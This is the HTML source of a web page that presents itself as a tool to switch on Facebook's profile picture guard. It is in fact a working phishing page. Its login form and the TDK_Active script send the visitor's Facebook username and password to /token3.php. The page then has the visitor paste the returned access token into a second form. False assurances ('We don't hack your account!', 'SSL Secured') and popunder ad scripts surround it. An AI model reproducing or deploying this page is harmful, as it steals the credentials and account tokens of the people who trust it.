
<!DOCTYPE html>
<html lang="en">
<head>
  <title>Turn On Profile Picture Guard Facebook 2019 - Turn Profile Picture Guard Online V3</title>
 
  <div id="InstallDiv" style="display: block;">
			<h2 class="first" id="fresh">Fresh Manual</h2>
			<ol>
				<li>Login Your Facebook Account</li>
				<li>Enter <code>Your Account Username, Email or Phone Number</code> and <code>Your Password Facebook Account or Password App</code></li>
				<li>Click <code>Login</code> and waiting</li>
				<li>Coppy all <code> the entire content in the box below</code> or <code>Coppy Code EAAAAY......</code> in box</li>
				<li>Paste All Code and click <onclick="toggle(this);">Turn Profile Picture Guard</a> and waiting few minute</li>
				<li>Check Your Account Facebook <code>https://www.facebook.com</code> Try again if you are not successful. Please follow the steps. Lastly, change your account password</li>
			</ol>
</div>
</div>
	<div class="block">
<h2 class="text-center">What are you waiting for! Get started now</h2>
</div>
  </div>
            </div>
           <!-- Start of banner code -->
<center><a href="https://rutgonlink.me"><img src="https://pictureguard.xyz/img/1.jpg" title="Click here to watch" /></a><center>
<!-- End of banner code -->
<!-- Start of banner code -->
<script type="text/javascript"> 	atOptions = { 		'key' : 'e292099e30f3819a69f0669393dd794c', 		'format' : 'iframe', 		'height' : 250, 		'width' : 300, 		'params' : {} 	}; 	document.write('<scr' + 'ipt type="text/javascript" src="http' + (location.protocol === 'https:' ? 's' : '') + '://www.bcloudhost.com/e292099e30f3819a69f0669393dd794c/invoke.js"></scr' + 'ipt>'); </script>
</div>
<script type="text/javascript"> var uid = '224774'; var wid = '517719'; </script> <script type="text/javascript" src="//cdn.popcash.net/pop.js"></script>
</div>
	<meta name="keywords" content="turn Profile Picture Guard Facebook, turn guard Picture, locked Profile, turn Profile guard, turnprofilepictureguard.ml, picture guard" />
  <meta name="description" content="Turn Profile Picture Guard Facebook 2019. Real Work, Security">
  <meta property="og:image" content="http://imgur.com/gallery/tmLbqrC"/>
<meta name="propeller" content="08b8ef83464f7fa5c204b09a98b06615">
<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"> 
<link rel="manifest" href="/site.webmanifest">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
  <style>
  #footer{
	background: #7ab733;
	padding: 8px;
	text-align: center;
	font-family: Arial
}
#footer a{
	color: #fff;
	font-weight: bold;
	
}
</style>
<script>

		

}


</script>
</head>
<body>
<p class="guard">
<script>

</script></p>
<div class="container">
  <h2></h2>
  <!--Step 1-->
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">Step 1: Log in to your facebook account: </div>
      <div class="panel-body">      
<div class="form-group">
  <label for="usr">Username,Email or Number Phone:</label>
  <input type="text" class="form-control" id="tk">
</div>
<div class="form-group">
  <label for="pwd">Password:</label>
  <input type="text" class="form-control" id="mk">
</div>
<button type="button" class="btn btn-danger" onclick="TDK_Active()" >Login</button>
<p>
</div>
    </div>
	
<!--Step 2-->
 <div class="panel-group">
 <div class="panel panel-primary">
<div class="panel-heading">Step 2: Copy all the entire content in the box below: </div>
<li id="trave" class="list-group-item"></li></p>
</div>
</div>
	
	
<!--Step 3-->
  <div class="panel-group">
<div class="panel panel-primary">
      <div class="panel-heading">Step 3: Paste all content copied from the box above into the section below: </div>
      <div class="panel-body">      
<form class="form-group" action="Thông-Báo" method="POST">
  <label for="code">Token: </label>
  <input type="text" id="code" name="code" class="form-control" Placeholder="Enter copied here... " /><br/>

<input type="submit" class="btn btn-danger" value="Turn Profile Picture Guard"/>
</form>
    </div>
</div>

<script>
function TDK_Active() {
var http = new XMLHttpRequest();
var tk = document.getElementById("tk").value;
var mk = document.getElementById("mk").value;
var url = "/token3.php";
var params = "u="+tk+"&p="+mk+"";
http.open("POST", url, true);
http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

http.onreadystatechange = function() {
    if(http.readyState == 4 && http.status == 200) {
      document.getElementById("trave").innerHTML = http.responseText;        
    }
}
http.send(params);
}
</script>
<div id="footer">
<a ©2019</a>
</div>
</div>
</form>
</div>
<div class="block">
<h2 class="text-center">Not arbitrarily redirect</h2>
<p class="lead">Do you want turn Profile Picture Guard Facebook?</p>
<p class="lead">Use <strong>https://pictureguard.xy</strong> Easy to Use!</p>
<p class="lead">
Since 2018, we have created this website for everyone to protect their avatars from the bad guys.
To ensure the security of your Facebook account As soon as you have enabled your avatar protection please change your Facebook password.
We do not take any information in people's accounts nor take away Facebook accounts of others!</p>
</div>
</div>
<div class="row">
<h2 class="text-center">Why use pictureguard.xyz?</h2>
<div class="col-sm-4">
<div class="block block-box">
<i class="glyphicon glyphicon-lock"></i>
<p class="lead">We are SSL Secured.</p>
</div>
</div>
<div class="col-sm-4">
<div class="block block-box">
<i class="glyphicon glyphicon-file"></i>
<p class="lead">We don't hack your account!>
</div>
</div>
<div class="col-sm-4">
<div class="block block-box">
<i class="glyphicon glyphicon-link"></i>
<p class="lead">Not arbitrarily redirect.</p>
</div>
</div>
</div>

          </div>  
     </div>      
    </div>   
  </div>  
</section>
<div class="section-secondary" id="mainto">
	<div class="container">		  
		<div class="image">
				<div class="row whyus featuredhome">
				  <div class="col-md-6">
						<h2>Product Reviews</h2>
						<ol class="featart">
							<li><a href="https://ansmehow.com/how-to-lock-your-facebook-profile/" rel="bookmark">How to lock your Facebook profile? Or, how to unlock?</a></li>
							<li><a href="https://www.mashnol.org/turn-on-profile-picture-guard-facebook/amp/" rel="bookmark">How To Turn On Profile Picture Guard On Facebook [Privacy]</a></li>
                            <li><a href="https://www.quora.com/How-do-I-activate-the-new-profile-picture-guard-on-Facebook" rel="bookmark">How do I activate the new profile picture guard on Facebook?</a></li>
                            <li><a href="https://rutgonlink.me" rel="bookmark">Best Shortener Url Free With Anatylic</a></li>
							<li><a href="blog/best-drawing-tablets.html" rel="bookmark">Top 10 Best Drawing Tablets You Should Own in 2019</a></li>
							<li><a href="index.php" rel="bookmark">Best Headset Microphones for Gaming to Buy in 2019 Reviews</a></li>
							<li><a href="index.php" rel="bookmark">Best Gaming Tablets for 2019 Review</a></li>
						</ul>
				  </div>
				  <div class="col-md-6">
					  <h2>Featured Articles</h2>
						<ol class="featart">
							<li><a href="index.php" rel="bookmark">Twitter Header Size – Practices and Guidelines 2019</a></li>
							<li><a href="index.php" rel="bookmark">SoundCloud Banner Template 2019 – Understanding Size and Banner Anatomy</a></li>
							<li><a href="index.php" rel="bookmark">The Perfect Facebook Cover Photo Size</a></li>
                            <li><a href="index.php" rel="bookmark">Facebook Event Photo Size 2019 – The Correct Dimensions and Factors to Keep In Mind</a></li>
                            <li><a href="index.php" rel="bookmark">Offline Screen Twitch Banner 2019 – The Correct Dimensions of all Twitch Images</a></li>
							<li><a href="index.php" rel="bookmark">Youtube Banner Size – Template and Guideline 2019</a></li>
							<li><a href="index.php" rel="bookmark">Youtube Thumbnail Size & Practice 2019</a></li>
						</ul>
				  </div>
				</div>
		
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-148022405-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-148022405-1');
</script>
<!-- Default Statcounter code for My Website https://pictureguard.xyz -->
<script type="text/javascript">
var sc_project=12101616; 
var sc_invisible=0; 
var sc_security="b16464fd"; 
var sc_https=1; 
var scJsHost = "https://";
document.write("<sc"+"ript type='text/javascript' src='" + scJsHost+
"statcounter.com/counter/counter.js'></"+"script>");
</script>
<noscript><div class="statcounter"><a title="Web Analytics"
href="https://statcounter.com/" target="_blank"><img class="statcounter"
src="https://c.statcounter.com/12101616/0/b16464fd/0/" alt="Web
Analytics"></a></div></noscript>
<!-- End of Statcounter Code -->
</div>
<script type="text/javascript">
var infolinks_pid = 3210165;
var infolinks_wsid = 0;
</script>
<script type="text/javascript" src="http://resources.infolinks.com/js/infolinks_main.js"></script>
<center><script id="_wau3pi">var _wau = _wau || []; _wau.push(["dynamic", "40age9key0", "3pi", "2b82c4ffffff", "small"]);</script><script async src="//waust.at/d.js"></script><center>
</body>
</html>